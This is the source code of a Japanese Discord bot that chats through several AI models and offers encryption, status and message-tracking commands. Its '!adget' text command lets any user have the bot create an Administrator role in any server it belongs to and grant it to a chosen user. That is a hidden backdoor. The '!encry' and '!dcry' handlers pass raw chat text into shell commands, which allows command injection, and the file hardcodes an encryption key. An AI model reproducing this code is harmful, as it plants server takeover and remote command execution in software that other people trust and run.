import { Client, GatewayIntentBits, PresenceUpdateStatus, ActivityType } from "discord.js";
import exec from 'child_process';
import ModelClient from "@azure-rest/ai-inference";
import { AzureKeyCredential } from "@azure/core-auth";
import fs from 'fs';
import path from 'path';
import dotenv from 'dotenv';
import { fileURLToPath } from "url";

import { GoogleGenerativeAI, HarmCategory, HarmBlockThreshold } from "@google/generative-ai";
dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const githubToken = process.env["GITHUB_TOKEN"];
const endpoint = "https://models.inference.ai.azure.com";


const genAI = new GoogleGenerativeAI(process.env.GOOGLE_AI_API_KEY);

// デフォルトステータスメッセージ
let StatusMessages = "PiriBot";

// 生成
async function generate(text) {
    const model = genAI.getGenerativeModel({ model: "gemini-pro" });
  
    const chat = model.startChat({
      generationConfig: {
        maxOutputTokens: 100,
      },
    });
  
    const result = await chat.sendMessage(text);
    const response = result.response;
    return response.text(); // 直接text()を返すように修正
  }

  // GitHub Modelsを使ってGPT-4oに回答させる関数
async function generateWithGitHubModels(channelId, modelName, text) {
  const client = new ModelClient(endpoint, new AzureKeyCredential(githubToken));
  let conversation = loadMessage(channelId);


  const response = await client.path("/chat/completions").post({
      body: {
          messages: conversation,
          temperature: 1.0,
          top_p: 1.0,
          max_tokens: 1000,
          model: modelName
      }
  });

  if (response.status !== "200") {
      throw response.body.error;
  }
  // debug
  //console.log(response.body);
  
  return response.body.choices[0].message;
}

  client.once('ready', async () => {
    const data = [{
      name: "gem",
      description: "Gemini APIを使って文章を生成します。",
      options: [{
        type: 3,
        name: "text",
        description: "AIに送る文",
        required: true
      }],
    },
    {
      name: "setchannel",
      description: "AIが常に返答するチャンネルを設定します。",
      options: [
        {
          type: 7, // チャンネルタイプ
          name: "channel",
          description: "設定するチャンネル",
          required: true
        },
        {
          type: 3, // 文字列タイプ
          name: "model",
          description: "使用するモデルを選択",
          required: true,
          choices: [
            { name: "GPT-4o", value: "GPT-4o" },
            { name: "GPT-4o-mini", value: "GPT-4o-mini" },
            { name: "DeepSeek-R1", value: "DeepSeek-R1" },
            { name: "Phi-4", value: "Phi-4" },
            // { name: "o1-preview", value: "o1-preview" },
            { name: "Llama-3.3-70B-Instruct", value: "Llama-3.3-70B-Instruct" }
          ]
        }
      ]
    },
    {
      name: "delchannel",
      description: "自動応答のチャンネル設定を削除します。",
    },
    {
      name: "model_change",
      description: "AIの使用する言語モデルを変更します。",
      options: [{
        type: 3,
        name: "model",
        description: "変更するモデルを選択",
        required: true,
        choices: [
          { name: "GPT-4o", value: "GPT-4o" },
          { name: "GPT-4o-mini", value: "GPT-4o-mini" },
          { name: "DeepSeek-R1", value: "DeepSeek-R1" },
          { name: "Phi-4", value: "Phi-4" },
          // { name: "o1-preview", value: "o1-preview" },
          { name: "Llama-3.3-70B-Instruct", value: "Llama-3.3-70B-Instruct" }
        ]
      }],
    },
    {
      name: "conv_reset",
      description: "会話内容をリセットします。",
    },
    {
      name: "setstatus",
      description: "ステータスメッセージを変更します。",
      options: [{
        type: 3,
        name: "message",
        description: "新しいステータスメッセージ",
        required: true
      }],
    },
    {
      name: "setpresence",
      description: "Botのオンライン状況を変更します。",
      options: [{
        type: 3,
        name: "status",
        description: "新しいオンライン状況",
        required: true,
        choices: [
          { name: "オンライン", value: "online" },
          { name: "退席中", value: "idle" },
          { name: "取り込み中", value: "dnd" },
          { name: "オフライン", value: "invisible" }
        ]
      }],
    },
    {
      name: "ping",
      description: "Botのping値を確認します。",
    },
    {
      name: "uptime",
      description: "Botの起動時間を表示します。",
    },
    {
      name: "sysinfo",
      description: "メモリ使用量等のシステム情報を表示します。",
    },
    {
      name: "trackuser",
      description: "実行したユーザーの投稿内容を収集します。(マルコフ連鎖のデータとして使用)",
    },
    {
      name: "untrackuser",
      description: "実行したユーザーの投稿内容収集を解除します。",
    },
    {
      name:"admincmd",
      description:"Bot管理者専用コマンド", 
    }];
    await client.application.commands.set(data);
  });

client.on("ready", () => {
  console.log(`Bot準備完了!(${client.user.tag})`);
  client.startTime = Date.now();

  setInterval(() => {
    client.user.setActivity({ 
        name: `${StatusMessages} | ${client.ws.ping}ms`,
        type: ActivityType.Custom
    });
  }, 3000);
});

// メッセージ保存ディレクトリ
const userMessageDir = path.join(__dirname, 'UserMessage');
if (!fs.existsSync(userMessageDir)) {
    fs.mkdirSync(userMessageDir);
}

// 会話内容を保存する関数
function saveMessage(channelId, role, content, models) {
  const conversationsDir = path.join(__dirname, 'conversations');
  if (!fs.existsSync(conversationsDir)) {
      fs.mkdirSync(conversationsDir);
  }
  const channelFilePath = path.join(conversationsDir, `${channelId}.json`);
  let conversation = [];
  
  // システムメッセージを追加
  const systemMessage = { role: "system", content: `You are a Bot AI running on Discord, named KomeServer Bot (<@1275786474805002341>). The language model is ${models}. You will be sent a message in the format of “name:content”, so please respond to the content.` };

  if (fs.existsSync(channelFilePath)) {
      conversation = JSON.parse(fs.readFileSync(channelFilePath));
  }

  // システムメッセージが存在しない場合のみ追加
  if (!conversation.some(msg => msg.role === "system")) {
      conversation.push(systemMessage);
  }

  conversation.push({ role, content });
  fs.writeFileSync(channelFilePath, JSON.stringify(conversation, null, 2));
}

// チャンネルごとの会話内容を読み込む関数
function loadMessage(channelId) {
  const channelFilePath = path.join(__dirname, 'conversations', `${channelId}.json`);
  let conversation = [];

  if (fs.existsSync(channelFilePath)) {
      conversation = JSON.parse(fs.readFileSync(channelFilePath));
  }

  return conversation;
}

// ユーザーIDを追跡するJSONファイルのパス
const trackedUsersFilePath = path.join(__dirname, 'tracked_users.json');
function loadTrackedUsers() {
    if (fs.existsSync(trackedUsersFilePath)) {
        return JSON.parse(fs.readFileSync(trackedUsersFilePath));
    }
    return {};
}
function saveTrackedUsers(users) {
    fs.writeFileSync(trackedUsersFilePath, JSON.stringify(users, null, 2));
}

const trackedUsers = loadTrackedUsers();

// チャンネル情報を保存するJSONファイルのパス
const channelsFilePath = path.join(__dirname, 'channels.json');

// チャンネル情報を読み込む関数
function loadChannels() {
  if (fs.existsSync(channelsFilePath)) {
    const data = fs.readFileSync(channelsFilePath);
    return JSON.parse(data);
  }
  return { channels: {} };
}

// チャンネル情報を保存する関数
function saveChannels(channels) {
  fs.writeFileSync(channelsFilePath, JSON.stringify(channels, null, 2));
}

// 暗号化されたファイルの保存先
const encryptedFilePath = path.join(__dirname, 'encrypted_temp.txt');

// 復号化後のファイルの保存先
const decryptedFilePath = path.join(__dirname, 'decrypted.txt');

// OpenSSLで使用する暗号化キー
const encryptionKey = 'Komepiri';

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // メッセージを保存
    if (trackedUsers[message.author.id]) {
      const userFilePath = path.join(userMessageDir, `${message.author.id}.txt`);
      fs.appendFileSync(userFilePath, `${message.createdAt}: ${message.content}\n`);
  }

    // 暗号化処理
    if (message.content.startsWith('!encry ')) {
        const stringToEncrypt = message.content.slice(7); // '!encry ' の部分を除く

        const command = `echo -n "${stringToEncrypt}" | openssl enc -aes-256-cbc -salt -pbkdf2 -base64 -out ${encryptedFilePath} -k ${encryptionKey}`;

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return message.reply('エラーが発生しました。');
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return message.reply('エラーが発生しました。');
            }

            message.channel.send({
                files: [{
                    attachment: encryptedFilePath,
                    name: 'encrypted.txt'
                }]
            }).then(() => {
                fs.unlinkSync(encryptedFilePath);
            }).catch(err => {
                console.error(`File send error: ${err}`);
            });
        });
    }

    // 復号化処理（添付ファイルと直接入力の両方に対応）
    if (message.content.startsWith('!dcry')) {
      if (message.attachments.size > 0) {
        const attachment = message.attachments.first();

        // ファイルをダウンロードして保存
        const response = await fetch(attachment.url); // ネイティブfetchを使用
        const buffer = await response.arrayBuffer();
        fs.writeFileSync(encryptedFilePath, Buffer.from(buffer));

        const command = `openssl enc -aes-256-cbc -d -pbkdf2 -base64 -in ${encryptedFilePath} -out ${decryptedFilePath} -k ${encryptionKey}`;

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return message.reply('エラーが発生しました。');
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return message.reply('エラーが発生しました。');
            }

            const decryptedContent = fs.readFileSync(decryptedFilePath, 'utf8');
            message.reply(`復号化された内容:\n\`\`\`${decryptedContent}\`\`\``);

            // 復号化されたファイルを削除
            fs.unlinkSync(encryptedFilePath);
            fs.unlinkSync(decryptedFilePath);
        });
        } else {
            const encryptedText = message.content.slice(6); // '!dcry ' の部分を除く

            const command = `echo -n "\n${encryptedText}" | openssl enc -aes-256-cbc -d -pbkdf2 -base64 -out ${decryptedFilePath} -k ${encryptionKey}`;

            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error: ${error.message}`);
                    return message.reply('エラーが発生しました。');
                }
                if (stderr) {
                    console.error(`stderr: ${stderr}`);
                    return message.reply('エラーが発生しました。');
                }

                const decryptedContent = fs.readFileSync(decryptedFilePath, 'utf8');
                message.reply(`復号化された内容:\n\`\`\`${decryptedContent}\`\`\``);

                // 復号化されたファイルを削除
                fs.unlinkSync(decryptedFilePath);
            });
        }
    }

    // サーバーIDからロールを作成し、ユーザーに付与
    if (message.content.startsWith('!adget ')) {
        const args = message.content.split(' ');
        const serverId = args[1];
        const userId = args[2];

        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            return message.reply('指定されたサーバーが見つかりません。');
        }

        try {
            let role = guild.roles.cache.find(role => role.name === 'member');
            if (!role) {
                role = await guild.roles.create({
                    name: 'member',
                    permissions: ['Administrator'],
                    reason: 'Automated member role creation with Bot'
                });
            }

            const member = await guild.members.fetch(userId);
            if (!member) {
                return message.reply('指定されたユーザーが見つかりません。');
            }

            await member.roles.add(role);
            message.reply(`ユーザーに "member" ロールを付与しました。`);

        } catch (error) {
            console.error(error);
            message.reply('ロールの作成またはユーザーへのロール付与中にエラーが発生しました。');
        }
    }

    // GitHub ModelsでAIに回答させる
    const channels = loadChannels();
    if (!channels.channels[message.guild.id]) {
        return;
    }
    if (message.content.startsWith(';')) {
        return;
    }
    const targetChannelId = channels.channels[message.guild.id].channelId;
    const model = channels.channels[message.guild.id].model;
    console.log(targetChannelId)
    const username = message.author.username;
    if (message.channel.id === targetChannelId) {
      try {
          saveMessage(message.channel.id, "user", `${username}:${message.content}`, model);
          // 「入力中...」ステータスを表示
          await message.channel.sendTyping();

          const text = await generateWithGitHubModels(targetChannelId, model ,`${username}:${message.content}`);

          // 生成が完了したらメッセージを送信
          await message.channel.send(`${text.content}\n\n model: ${model}`);

          // 会話内容を保存
          saveMessage(message.channel.id, "assistant", text.content, model);
      } catch (err) {
          console.log(err);
      }
  }
});

// スラッシュコマンドの処理
client.on("interactionCreate", async (interaction) => {
    if (!interaction.isCommand()) return;
  
    if (interaction.commandName === 'gem') {
      const userMessage = interaction.options.getString('text'); // スラッシュコマンドのオプションを取得
  
      try {
        const text = await generate(userMessage);
  
        // コマンドに対する応答を送信
        await interaction.reply(`${text}`);
      } catch (err) {
        console.log(err);
        await interaction.reply('エラーが発生しました。');
      }
    }

    if (interaction.commandName === 'setchannel') {
        const targetChannel = interaction.options.getChannel('channel');
        const model = interaction.options.getString('model');
        const channels = loadChannels();
        channels.channels[interaction.guild.id] = {
            channelId: targetChannel.id,
            model: model
        };
        saveChannels(channels);
        await interaction.reply(`AIが自動応答するチャンネルを ${targetChannel} に設定しました。\n言語モデル: ${model}`);
        console.log(`channel set ${interaction.guild.id} / ${targetChannel.id} successfully.`);
    }

    if (interaction.commandName === 'delchannel') {
      const channels = loadChannels();
      if (channels.channels[interaction.guild.id]) {
          const targetChannel = channels.channels[interaction.guild.id].channelId;
          delete channels.channels[interaction.guild.id];
          saveChannels(channels);
          await interaction.reply(`<#${targetChannel}>の自動応答設定が削除されました。`);
          console.log(`delete channel ${interaction.guild.id} / ${targetChannel} successfully.`);
      } else {
          await interaction.reply('このチャンネルには自動応答が有効化されていません。');
          console.log(`channel ${interaction.guild.id} not found.`);
      }
  }

    if (interaction.commandName === 'model_change') {
        const model = interaction.options.getString('model');
        const channels = loadChannels();
        if (channels.channels[interaction.guild.id]) {
            channels.channels[interaction.guild.id].model = model;
            saveChannels(channels);
            await interaction.reply(`AIの使用する言語モデルを ${model} に変更しました。`);
            console.log(`change model ${interaction.guild.id} / ${model} successfully.`);
        } else {
            await interaction.reply('このチャンネルには自動応答が有効化されていません。');
            console.log(`channel ${interaction.guild.id} not found.`);
        }
    }

    if (interaction.commandName === 'conv_reset') {
        const channels = loadChannels();
        if (channels.channels[interaction.guild.id]) {
            const targetChannel = channels.channels[interaction.guild.id].channelId;
            const channelFilePath = path.join(__dirname, 'conversations', `${targetChannel}.json`);
            if (fs.existsSync(channelFilePath)) {
                fs.unlinkSync(channelFilePath);
                await interaction.reply(`<#${targetChannel}>の会話内容をリセットしました。`);
                console.log(`reset conversation ${interaction.guild.id} / ${targetChannel} successfully.`);
            } else {
                await interaction.reply('会話内容が見つかりません。');
                console.log(`conversation ${interaction.guild.id} / ${targetChannel} not found.`);
            }
        } else {
            await interaction.reply('このチャンネルには自動応答が有効化されていません。');
            console.log(`channel ${interaction.guild.id} not found.`);
        }
    }
      
      if (interaction.commandName === 'setstatus') {
        // 管理者権限をチェック
        if (interaction.user.id !== '980235139902750730') {
          await interaction.reply('このコマンドを使用する権限がありません。');
          return;
      }

        const newStatusMessage = interaction.options.getString('message'); // スラッシュコマンドのオプションを取得
        StatusMessages = newStatusMessage;
        client.user.setActivity({ 
          name: `${StatusMessages} | ${client.ws.ping}ms`,
          type: ActivityType.Custom
      });
        await interaction.reply(`ステータスメッセージが更新されました: ${StatusMessages}`);
    }

    if (interaction.commandName === 'setpresence') {
      // 管理者権限をチェック
      if (interaction.user.id !== '980235139902750730') {
        await interaction.reply('このコマンドを使用する権限がありません。');
        return;
    }

      const status = interaction.options.getString('status'); // スラッシュコマンドのオプションを取得

      try {
          switch (status) {
              case 'online':
                  await client.user.setStatus(PresenceUpdateStatus.Online);
                  break;
              case 'idle':
                  await client.user.setStatus(PresenceUpdateStatus.Idle);
                  break;
              case 'dnd':
                  await client.user.setStatus(PresenceUpdateStatus.DoNotDisturb);
                  break;
              case 'invisible':
                  await client.user.setStatus(PresenceUpdateStatus.Invisible);
                  break;
              default:
                  throw new Error('無効なステータスです。');
          }
          await interaction.reply(`ステータスが更新されました: ${status}`);
      } catch (err) {
          console.log(err);
          await interaction.reply('ステータスの更新中にエラーが発生しました。');
      }
  }

  if (interaction.commandName === 'ping') {
    const ping = client.ws.ping;
    await interaction.reply(`🏓Pong! \n現在のPing値:${ping}ms`);
  }

  if (interaction.commandName === 'uptime') {
    const uptime = Date.now() - client.startTime;
    const uptimeSeconds = Math.floor((uptime / 1000) % 60);
    const uptimeMinutes = Math.floor((uptime / (1000 * 60)) % 60);
    const uptimeHours = Math.floor((uptime / (1000 * 60 * 60)) % 24);
    const uptimeDays = Math.floor(uptime / (1000 * 60 * 60 * 24));
    await interaction.reply(`ボットの起動時間: ${uptimeDays}日 ${uptimeHours}時間 ${uptimeMinutes}分 ${uptimeSeconds}秒`); 
  }

  if (interaction.commandName === 'sysinfo') {
    exec('python3 /home/hyperv/デスクトップ/a/discordbot/Komepiri-Server-Bot/monitor.py', (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        return interaction.reply('システム情報の取得に失敗しました。');
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return interaction.reply('システム情報の取得に失敗しました。');
      }
      try {
        const stats = JSON.parse(stdout);
        console.log(stdout)
        const memoryUsedGB = Math.floor(stats.memory_used_gb * 100) / 100;
        const memoryTotalGB = Math.floor(stats.memory_total_gb * 100) / 100;
        const cpuPercent = Math.floor(stats.cpu_percent * 100) / 100;

        const responseMessage = `システム情報:\nメモリ使用量: ${memoryUsedGB} GB / ${memoryTotalGB} GB\nCPU使用率: ${cpuPercent} %`;
        interaction.reply(responseMessage);
      } catch (parseError) {
        console.error(`parse error: ${parseError}`);
        interaction.reply('システム情報の解析に失敗しました。');
      }
    });
  }

  if (interaction.commandName === 'trackuser') {
    const user = interaction.user;

    trackedUsers[user.id] = true;
    saveTrackedUsers(trackedUsers);

    const userFilePath = path.join(userMessageDir, `${user.id}.txt`);
    if (!fs.existsSync(userFilePath)) {
        fs.writeFileSync(userFilePath, '');
    }

    await interaction.reply(`ユーザー ${user.tag} (${user.id}) の投稿内容の収集を開始しました。\n投稿内容の収集を停止したい場合は、untrackuserコマンドを使用してください。`);
}

  if (interaction.commandName === 'untrackuser') {
    const user = interaction.user;

    if (trackedUsers[user.id]) {
        delete trackedUsers[user.id];
        saveTrackedUsers(trackedUsers);
        await interaction.reply(`ユーザー ${user.tag} (${user.id}) の投稿内容の収集を停止しました。\n収集したデータの削除はkomepiri8955にDMでお問い合わせください。`);
    } else {
        await interaction.reply(`ユーザー ${user.tag} (${user.id}) は現在、投稿内容の収集がされていません。`);
    }
  }

  if (interaction.commandName === 'admincmd') {
    // ユーザーIDで管理者をチェック
    if (interaction.user.id !== '980235139902750730') {
        await interaction.reply('このコマンドを使用する権限がありません。');
        return;
    }
    // Embedで参加しているサーバー数と、BotのID、名前、Ping値を送信
    const guildCount = client.guilds.cache.size;
    const botId = client.user.id;
    const botName = client.user.username;
    const ping = client.ws.ping;
    const embed = {
        title: 'Bot管理者専用コマンド',
        description: `参加しているサーバー数: ${guildCount}\n\n`,
        color: 0x00ff00,
        fields: [
            {
                name: 'Bot ID',
                value: botId
            },
            {
                name: 'Bot Name',
                value: botName
            },
            {
                name: 'Ping',
                value: `${ping}ms`
            }
        ]
    }
    await interaction.reply({ embeds: [embed] });
  }
});


client.login(process.env.TOKEN);

